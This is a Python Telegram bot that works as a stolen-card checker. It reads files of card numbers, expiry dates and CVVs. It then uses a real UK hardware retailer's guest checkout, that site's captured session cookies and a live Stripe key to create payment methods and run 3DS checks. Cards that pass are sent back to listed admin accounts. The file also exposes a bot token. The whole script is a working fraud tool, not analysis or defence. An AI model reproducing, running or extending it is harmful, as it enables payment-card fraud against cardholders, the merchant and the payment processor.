import os
import sys
import asyncio
import logging
import random
import string
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
import json
import base64
import urllib.parse

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8166484030:AAEcpDe4EIoSRMCFKXQq33scCSiRaEfzAWU"
ADMIN_IDS = [5895491379, 844663875]
CART_ID = ""

COOKIES = {
    'store_switcher_popup_closed': 'closed',
    'wp_customerGroup': 'NOT%20LOGGED%20IN',
    'store': 'default',
    'geoip_store_code': 'default',
    'searchReport-log': '0',
    '_ga': 'GA1.1.1544945931.1762996300',
    '_fbp': 'fb.1.1762996300449.745185757966968218',
    'currency_code': 'GBP',
    'twk_idm_key': 'PMoLl3NLO_4dYa5TygOUk',
    '__stripe_mid': '5ba8807a-b591-46e1-8779-a46eb868a4f6906666',
    'form_key': 'zm3VIr7fkHHjLXLQ',
    '_gcl_au': '1.1.515112964.1762996300.1452801322.1763014957.1763014957',
    'private_content_version': 'e2595143240d4c9339c06c6abde76403',
    'PHPSESSID': 'o495ud819llgdnbi8r111qouqs',
    'sociallogin_referer_store': 'https://www.ironmongeryworld.com/checkout/cart/',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    '_ga_PGSR3N5SW9': 'GS2.1.s1763018847$o5$g1$t1763018848$j59$l0$h1533942665',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'section_data_ids': '{%22customer%22:1763018849%2C%22messages%22:1763018849%2C%22compare-products%22:1763018849%2C%22last-ordered-items%22:1763018849%2C%22cart%22:1763018849%2C%22directory-data%22:1763018849%2C%22captcha%22:1763018849%2C%22instant-purchase%22:1763018849%2C%22loggedAsCustomer%22:1763018849%2C%22persistent%22:1763018849%2C%22review%22:1763018849%2C%22wishlist%22:1763018849%2C%22gtm%22:1763018849%2C%22wp_confirmation_popup%22:1763018849%2C%22recently_viewed_product%22:1763018849%2C%22recently_compared_product%22:1763018849%2C%22product_data_storage%22:1763018849%2C%22paypal-billing-agreement%22:1763018849}',
    '_uetsid': '464c7840becf11f08903dfcb43b5c71c',
    '_uetvid': '464c81c0becf11f08a53418e9d7cada4',
    'TawkConnectionTime': '0',
    'twk_uuid_62308ea51ffac05b1d7eb157': '%7B%22uuid%22%3A%221.AGJiGUpszpgFyK1fuLzv7ux73zcIxiPU5UywW1HN5uhgsjjnWh4i9F0OMR4T9BhpDPR4USYpzwLAzPRNrpLIjIpoKvc0t7P14AaYhdeCxg6BfbbW1XjgRdrynUXBNBBP%22%2C%22version%22%3A3%2C%22domain%22%3A%22ironmongeryworld.com%22%2C%22ts%22%3A1763018849856%7D',
}

def generate_random_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com']
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{random_string}@{random.choice(domains)}"

def get_quote_id_smart(product_id=16124, qty=1, cookies=None):
    global CART_ID
    if cookies is None:
        cookies = COOKIES
    
    try:
        headers = {'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest'}
        params = {'sections': 'cart', 'force_new_section_timestamp': 'true', '_': str(int(time.time() * 1000))}
        
        r = requests.get('https://www.ironmongeryworld.com/customer/section/load/', params=params, cookies=cookies, headers=headers, timeout=15)
        if r.status_code != 200:
            return None
        
        data = r.json()
        cart = data.get('cart', {})
        items_count = cart.get('summary_count', 0)
        
        if items_count == 0:
            headers_add = {'Accept': 'text/html,application/xhtml+xml', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.ironmongeryworld.com', 'User-Agent': 'Mozilla/5.0'}
            data_add = {'product': str(product_id), 'form_key': cookies.get('form_key'), 'qty': str(qty)}
            
            r_add = requests.post(f'https://www.ironmongeryworld.com/checkout/cart/add/product/{product_id}/', cookies=cookies, headers=headers_add, data=data_add, allow_redirects=True, timeout=15)
            if r_add.status_code not in [200, 302]:
                return None
            
            time.sleep(2)
            r = requests.get('https://www.ironmongeryworld.com/customer/section/load/', params=params, cookies=cookies, headers=headers, timeout=15)
            data = r.json()
            cart = data.get('cart', {})
        
        quote_id = cart.get('mpquickcart', {}).get('quoteId')
        if quote_id:
            CART_ID = quote_id
            return quote_id
        return None
    except Exception as e:
        logger.error(f"Cart error: {e}")
        return None

stats = {
    'total': 0, 'checking': 0, 'authenticated': 0, 'challenge': 0, 'attempted': 0,
    'not_auth': 0, 'unavailable': 0, 'declined': 0, 'rejected': 0, 'errors': 0,
    'cart_refreshed': 0, 'cart_refresh_failed': 0, 'start_time': None, 'is_running': False,
    'dashboard_message_id': None, 'chat_id': None, 'current_card': '', 'last_response': 'Waiting...',
    'cards_checked': 0, 'authenticated_cards': [], 'challenge_cards': [], 'attempted_cards': []
}

class StripeChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {'accept': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        
    def check(self, card_number, exp_month, exp_year, cvv, retry_count=0, max_retries=3):
        global CART_ID
        
        try:
            random_email = generate_random_email()
            logger.info(f"Checking: {card_number[:6]}****{card_number[-4:]}")
            
            headers = self.headers.copy()
            headers.update({'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'})
            
            clean_card = card_number.replace(" ", "").replace("-", "")
            
            data = f'billing_details[address][state]=London&billing_details[address][postal_code]=SW1A+1AA&billing_details[address][country]=GB&billing_details[address][city]=London&billing_details[address][line1]=111+North+Street&billing_details[email]={random_email}&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={clean_card}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&pasted_fields=number&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
            
            r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=25)
            
            if r.status_code != 200:
                return 'DECLINED', 'Card declined'
            
            pm = r.json()
            if 'id' not in pm:
                return 'DECLINED', pm.get('error', {}).get('message', 'Invalid card')
            
            pm_id = pm['id']
            
            headers = self.headers.copy()
            headers.update({'content-type': 'application/json', 'origin': 'https://www.ironmongeryworld.com', 'referer': 'https://www.ironmongeryworld.com/onestepcheckout/', 'x-requested-with': 'XMLHttpRequest'})
            
            try:
                estimate_payload = {'address': {'country_id': 'GB', 'postcode': 'SW1A 1AA', 'region': 'London', 'region_id': 0}}
                r_estimate = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/estimate-shipping-methods', headers=headers, json=estimate_payload, timeout=25)
                
                carrier_code = 'matrixrate'
                method_code = 'matrixrate_1165'
                
                if r_estimate.status_code == 200:
                    shipping_methods = r_estimate.json()
                    if shipping_methods:
                        for m in shipping_methods:
                            if m.get('carrier_code') == 'matrixrate':
                                carrier_code = m.get('carrier_code', 'matrixrate')
                                method_code = m.get('method_code', 'matrixrate_1165')
                                break
            except:
                carrier_code = 'matrixrate'
                method_code = 'matrixrate_1165'
            
            shipping_payload = {
                'addressInformation': {
                    'shipping_address': {'countryId': 'GB', 'region': 'London', 'street': ['111 North Street'], 'company': '', 'telephone': '3609998856', 'postcode': 'SW1A 1AA', 'city': 'London', 'firstname': 'Card', 'lastname': 'Test'},
                    'billing_address': {'countryId': 'GB', 'region': 'London', 'street': ['111 North Street'], 'company': '', 'telephone': '3609998856', 'postcode': 'SW1A 1AA', 'city': 'London', 'firstname': 'Card', 'lastname': 'Test', 'saveInAddressBook': None},
                    'shipping_method_code': method_code,
                    'shipping_carrier_code': carrier_code,
                    'extension_attributes': {}
                }
            }
            
            try:
                r_shipping = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/shipping-information', headers=headers, json=shipping_payload, timeout=25)
                
                if r_shipping.status_code == 404 and retry_count < max_retries:
                    new_cart_id = get_quote_id_smart()
                    if new_cart_id:
                        stats['cart_refreshed'] += 1
                        time.sleep(2)
                        return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                    return 'ERROR', 'Cart expired'
            except:
                pass
            
            payload = {
                'cartId': CART_ID,
                'email': random_email,
                'billingAddress': {'countryId': 'GB', 'region': 'London', 'street': ['111 North Street'], 'company': '', 'telephone': '3609998856', 'postcode': 'SW1A 1AA', 'city': 'London', 'firstname': 'Card', 'lastname': 'Test', 'email': random_email, 'saveInAddressBook': None},
                'paymentMethod': {'method': 'stripe_payments', 'additional_data': {'payment_method': pm_id}}
            }
            
            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload, timeout=25)
            
            if r.status_code not in [200, 400]:
                error_text = r.text[:300]
                if any(k in error_text.lower() for k in ['no such entity', 'not found', 'cart', 'quote']) and retry_count < max_retries:
                    new_cart_id = get_quote_id_smart()
                    if new_cart_id:
                        stats['cart_refreshed'] += 1
                        time.sleep(2)
                        return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
                    stats['cart_refresh_failed'] += 1
                    return 'ERROR', 'Cart refresh failed'
                return 'DECLINED', 'Payment failed'
            
            res = r.json()
            if 'message' not in res:
                return 'DECLINED', 'Payment declined'
            
            message = res['message']
            
            if 'pi_' not in message:
                if 'order' in message.lower() or message.isdigit():
                    return 'Y', f'Order: {message}'
                return 'DECLINED', message[:100]
            
            if 'Authentication Required: ' in message:
                client_secret = message.replace('Authentication Required: ', '')
            elif ': ' in message:
                client_secret = message.split(': ')[1]
            else:
                client_secret = message
            
            if '_secret_' not in client_secret:
                return 'DECLINED', 'Invalid intent'
            
            pi_id = client_secret.split('_secret_')[0]
            
            headers = self.headers.copy()
            headers.update({'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'})
            
            params = {'is_stripe_sdk': 'false', 'client_secret': client_secret, 'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X', '_stripe_version': '2020-03-02'}
            
            r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}', params=params, headers=headers, timeout=25)
            
            if r.status_code != 200:
                return 'DECLINED', 'Fetch failed'
            
            pi = r.json()
            pi_status = pi.get('status', 'unknown')
            
            if 'next_action' not in pi:
                if pi_status == 'succeeded':
                    return 'Y', 'Payment succeeded'
                elif pi_status == 'requires_payment_method':
                    return 'DECLINED', 'Card declined'
                elif pi_status == 'requires_confirmation':
                    data = f'payment_method={pm_id}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
                    r = self.session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers, data=data, timeout=25)
                    if r.status_code == 200:
                        pi = r.json()
                        if pi.get('status') == 'succeeded':
                            return 'Y', 'Payment succeeded'
                    return 'DECLINED', 'Confirm failed'
                return 'DECLINED', f'Status: {pi_status}'
            
            next_action = pi['next_action']
            if 'use_stripe_sdk' not in next_action:
                return 'DECLINED', 'No 3DS'
            
            sdk_data = next_action['use_stripe_sdk']
            if 'three_d_secure_2_source' not in sdk_data:
                return 'DECLINED', 'No 3DS source'
            
            source = sdk_data.get('three_d_secure_2_source', '')
            trans_id = sdk_data.get('server_transaction_id', '')
            
            if not source or not trans_id:
                return 'DECLINED', 'Missing 3DS'
            
            fp_data = {"threeDSServerTransID": trans_id}
            fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
            
            browser_data = {"fingerprintAttempted": True, "fingerprintData": fp, "challengeWindowSize": None, "threeDSCompInd": "Y", "browserJavaEnabled": False, "browserJavascriptEnabled": True, "browserLanguage": "en", "browserColorDepth": "24", "browserScreenHeight": "786", "browserScreenWidth": "1397", "browserTZ": "-120", "browserUserAgent": "Mozilla/5.0"}
            
            browser_encoded = urllib.parse.quote(json.dumps(browser_data))
            data = f'source={source}&browser={browser_encoded}&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
            
            headers_3ds = self.headers.copy()
            headers_3ds.update({'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'})
            
            r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_3ds, data=data, timeout=25)
            
            if r.status_code != 200:
                return 'DECLINED', '3DS failed'
            
            auth = r.json()
            
            if 'ares' not in auth:
                return 'DECLINED', 'Invalid 3DS'
            
            trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
            
            status_map = {
                'Y': ('Y', '✅ Authenticated'),
                'C': ('C', '⚠️ Challenge Required'),
                'A': ('A', '🔵 Attempted'),
                'N': ('N', '❌ Not Authenticated'),
                'U': ('U', '🔴 Unavailable'),
                'R': ('R', '❌ Rejected'),
            }
            
            if trans_status in status_map:
                return status_map[trans_status]
            return ('DECLINED', f'Unknown: {trans_status}')
            
        except requests.exceptions.Timeout:
            return 'ERROR', 'Timeout'
        except requests.exceptions.ConnectionError:
            return 'ERROR', 'Connection failed'
        except Exception as e:
            return 'ERROR', str(e)[:50]

async def send_result(bot_app, card, status_type, message):
    try:
        card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
        status_emojis = {'Y': ('✅', 'AUTHENTICATED', 'Y - Authenticated'), 'C': ('⚠️', 'CHALLENGE', 'C - Challenge'), 'A': ('🔵', 'ATTEMPTED', 'A - Attempted')}
        
        if status_type not in status_emojis:
            return
        
        emoji, title, status_text = status_emojis[status_type]
        text = f"{emoji} **{title}**\n\n💳 `{card}`\n🔥 {status_text}\n📊 #{card_number}\n📍 {message}"
        
        if status_type == 'Y':
            stats['authenticated_cards'].append(card)
        elif status_type == 'C':
            stats['challenge_cards'].append(card)
        elif status_type == 'A':
            stats['attempted_cards'].append(card)
        
        await bot_app.bot.send_message(chat_id=stats['chat_id'], text=text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Send error: {e}")

async def check_card(card, bot_app):
    if not stats['is_running']:
        return card, "STOPPED", "Stopped"
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app)
        return card, "ERROR", "Invalid format"
    
    card_number, exp_month, exp_year, cvv = [p.strip() for p in parts]
    card_number = card_number.replace(' ', '').replace('-', '')
    exp_month = exp_month.zfill(2)
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]
    
    try:
        if not stats['is_running']:
            stats['checking'] -= 1
            return card, "STOPPED", "Stopped"
        
        checker = StripeChecker()
        status, message = checker.check(card_number, exp_month, exp_year, cvv)
        
        status_handlers = {
            'Y': ('authenticated', 'Auth ✅'),
            'C': ('challenge', 'Challenge ⚠️'),
            'A': ('attempted', 'Attempted 🔵'),
            'N': ('not_auth', 'Not Auth ❌'),
            'U': ('unavailable', 'Unavailable 🔴'),
            'R': ('rejected', 'Rejected ❌'),
            'DECLINED': ('declined', 'Declined ❌'),
        }
        
        if status in status_handlers:
            stat_key, response_text = status_handlers[status]
            stats[stat_key] += 1
            stats['checking'] -= 1
            stats['last_response'] = response_text
            await update_dashboard(bot_app)
            
            if status in ['Y', 'C', 'A']:
                await send_result(bot_app, card, status, message)
            
            return card, status, message
        else:
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = f'{status[:20]}'
            await update_dashboard(bot_app)
            return card, status, message
    except Exception as e:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app)
        return card, "EXCEPTION", str(e)

def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="total")],
        [InlineKeyboardButton(f"🔄 Checking: {stats['checking']}", callback_data="checking"), InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")],
        [InlineKeyboardButton(f"✅ Y: {stats['authenticated']}", callback_data="authenticated"), InlineKeyboardButton(f"⚠️ C: {stats['challenge']}", callback_data="challenge")],
        [InlineKeyboardButton(f"🔵 A: {stats['attempted']}", callback_data="attempted"), InlineKeyboardButton(f"❌ N: {stats['not_auth']}", callback_data="not_auth")],
        [InlineKeyboardButton(f"🔴 U: {stats['unavailable']}", callback_data="unavailable"), InlineKeyboardButton(f"❌ R: {stats['rejected']}", callback_data="rejected")],
        [InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"), InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")],
        [InlineKeyboardButton(f"🔄 Cart OK: {stats['cart_refreshed']}", callback_data="cart_refresh"), InlineKeyboardButton(f"❌ Cart Failed: {stats['cart_refresh_failed']}", callback_data="cart_failed")],
        [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 Stop", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    keyboard.append([InlineKeyboardButton(f"🛒 Cart: {CART_ID[:15]}...", callback_data="cart_info")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(chat_id=stats['chat_id'], message_id=stats['dashboard_message_id'], text="📊 **STRIPE 3DS CHECKER**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
        except:
            pass

async def send_final_files(bot_app):
    try:
        file_configs = [('authenticated_cards', '✅', 'Authenticated (Y)'), ('challenge_cards', '⚠️', 'Challenge (C)'), ('attempted_cards', '🔵', 'Attempted (A)')]
        
        for card_type, emoji, caption in file_configs:
            cards = stats.get(f'{card_type}', [])
            if cards:
                filename = f"{card_type}.txt"
                with open(filename, "w") as f:
                    f.write("\n".join(cards))
                
                with open(filename, "rb") as f:
                    await bot_app.bot.send_document(chat_id=stats['chat_id'], document=f, caption=f"{emoji} {caption} ({len(cards)})", parse_mode='Markdown')
                
                os.remove(filename)
    except Exception as e:
        logger.error(f"File error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    await update.message.reply_text("📊 **STRIPE 3DS CHECKER**\n\nSend .txt file with cards\nFormat: `number|month|year|cvv`\n\n**Responses:**\n✅ Y - Authenticated\n⚠️ C - Challenge\n🔵 A - Attempted\n❌ N - Not Auth\n🔴 U - Unavailable\n❌ R - Rejected", parse_mode='Markdown')

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ Check in progress!")
        return
    
    await update.message.reply_text("🔍 Verifying cart...")
    
    initial_cart = get_quote_id_smart()
    if initial_cart:
        await update.message.reply_text(f"✅ Cart ready!\n🛒 `{initial_cart}`", parse_mode='Markdown')
    else:
        await update.message.reply_text("⚠️ Cart warning")
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats.update({
        'total': len(cards), 'checking': 0, 'authenticated': 0, 'challenge': 0, 'attempted': 0,
        'not_auth': 0, 'unavailable': 0, 'declined': 0, 'rejected': 0, 'errors': 0,
        'cart_refreshed': 0, 'cart_refresh_failed': 0, 'current_card': '', 'last_response': 'Starting...',
        'cards_checked': 0, 'authenticated_cards': [], 'challenge_cards': [], 'attempted_cards': [],
        'start_time': datetime.now(), 'is_running': True, 'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await update.message.reply_text(text="📊 **STRIPE 3DS CHECKER**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    await update.message.reply_text(f"✅ Started!\n📊 Total: {len(cards)}\n🛒 Cart: `{CART_ID[:20]}...`", parse_mode='Markdown')
    
    asyncio.create_task(process_cards(cards, context.application))

async def process_cards(cards, bot_app):
    for i, card in enumerate(cards):
        if not stats['is_running']:
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(bot_app)
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app)
        
        await check_card(card, bot_app)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 3 == 0:
            await update_dashboard(bot_app)
        
        await asyncio.sleep(4)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app)
    
    summary = f"✅ **Completed!**\n\n📊 Total: {stats['total']}\n✅ Y: {stats['authenticated']}\n⚠️ C: {stats['challenge']}\n🔵 A: {stats['attempted']}\n❌ N: {stats['not_auth']}\n🔴 U: {stats['unavailable']}\n❌ R: {stats['rejected']}\n❌ Declined: {stats['declined']}\n⚠️ Errors: {stats['errors']}\n\n🔄 Cart OK: {stats['cart_refreshed']}\n❌ Cart Failed: {stats['cart_refresh_failed']}\n\n📁 Sending files..."
    
    await bot_app.bot.send_message(chat_id=stats['chat_id'], text=summary, parse_mode='Markdown')
    await send_final_files(bot_app)
    
    final = f"🎉 **Done!**\n\n🔄 Cart refreshes: {stats['cart_refreshed']}\n❌ Cart failures: {stats['cart_refresh_failed']}\n🛒 Final Cart: `{CART_ID}`\n\n✅ Stripe 3DS - transStatus Only"
    await bot_app.bot.send_message(chat_id=stats['chat_id'], text=final, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ Unauthorized", show_alert=True)
        return
    
    try:
        await query.answer()
    except:
        pass
    
    if query.data == "stop_check":
        if stats['is_running']:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(context.application)
            try:
                await context.application.bot.send_message(chat_id=stats['chat_id'], text="🛑 **Stopped!**", parse_mode='Markdown')
            except:
                pass
    
    elif query.data == "cart_info":
        cart_info = f"🛒 **Cart Info:**\n\n📋 `{CART_ID}`\n\n🔄 Refreshes: {stats['cart_refreshed']}\n⚡️ Auto-refresh: ON\n✅ transStatus Only"
        await query.answer(cart_info, show_alert=True)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

def main():
    logger.info("="*50)
    logger.info("🤖 Stripe 3DS Bot Starting")
    logger.info("🔄 Auto Cart Refresh")
    logger.info("✅ transStatus Only Detection")
    logger.info("="*50)
    
    initial_cart = get_quote_id_smart()
    if initial_cart:
        logger.info(f"✅ Cart verified: {initial_cart[:20]}...")
    else:
        logger.warning("⚠️ Cart verification failed")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)
    
    logger.info("✅ Bot running")
    logger.info("="*50)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("🛑 Bot stopped")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal: {e}")
        sys.exit(1)
